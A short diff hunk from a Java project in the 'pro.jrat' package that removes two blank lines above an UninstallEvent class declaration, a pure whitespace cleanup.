@@ -7,8 +7,6 @@ import pro.jrat.packets.outgoing.Packet36Uninstall;
 import pro.jrat.utils.IconUtils;
 import pro.jrat.utils.Utils;
 
-
-
 public class UninstallEvent extends Event {
 
 	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
